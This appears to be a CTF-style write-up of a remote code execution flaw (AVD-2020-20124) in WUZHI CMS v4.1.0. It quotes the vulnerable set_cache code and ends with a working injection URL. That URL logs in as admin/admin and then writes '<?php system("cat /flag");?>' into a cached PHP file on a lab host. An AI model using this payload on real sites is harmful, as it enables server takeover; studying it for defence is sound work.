## 1. 漏洞介绍
[阿里云漏洞库](https://avd.aliyun.com/detail?id=AVD-2020-20124)
## 2. 漏洞分析
[Remote Code Execution Vulnerability In WUZHI CMS v4.1.0 · Issue #188 · wuzhicms/wuzhicms · GitHub](https://github.com/wuzhicms/wuzhicms/issues/188)
In the set_cache method of the \coreframe\app\core\libs\function\common.func.php file, when $data is not of the array type, $data will be written directly to the php file.

```php
function set_cache($filename, $data, $dir = '_cache_'){
	static $_dirs;
	if ($dir == '') return FALSE;
	if (!preg_match('/([a-z0-9_]+)/i', $filename)) return FALSE;
	$cache_path = CACHE_ROOT . $dir . '/';
	if (!isset($_dirs[$filename . $dir])) {
		if (!is_dir($cache_path)) {
			mkdir($cache_path, 0777, true);
		}
		$_dirs[$filename . $dir] = 1;
	}

	$filename = $cache_path . $filename . '.' . CACHE_EXT . '.php';
	if (is_array($data)) {
		$data = '<?php' . "\r\n return " . array2string($data) . '?>';
	}
	file_put_contents($filename, $data);
}
```

The set_cache method is called in the set method of the \coreframe\app\attachment\admin\index.php file, and $GLOBALS['setting'] has not been filtered，so anything can be written to the php file.

```php
    public function set()
    {
        if (isset($GLOBALS['submit'])) {
            set_cache(M, $GLOBALS['setting']);
            MSG(L('operation_success'), HTTP_REFERER, 3000);
        } else {
            $show_dialog = 1;
            load_class('form');
            $setting = &$this->_cache;
            if(!isset($setting['show_mode'])) {
				$setting = array('show_mode'=>2,'watermark_enable'=>1,'watermark_pos'=>0,'watermark_text'=>'www.wuzhicms.com');
				set_cache(M, $setting);
			}
            include $this->template('set', M);
        }
    }
```

Finally, on line 21 of \coreframe\app\attachment\admin\index.php, a php file that can write arbitrary content will be loaded.  
`$this->_cache = get_cache(M);`
## 3. 漏洞复现
弱口令登录 admin/admin
burp suite 抓包重放读取 flag【由于缓存原因可多次尝试】
`http://eci-2…………9.cloudeci1.ichunqiu.com/www/index.php?m=attachment&f=index&v=set&_su=wuzhicms&submit=1&setting=<?php system("cat /flag");?>`

![1.png](https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202310031237875.png)
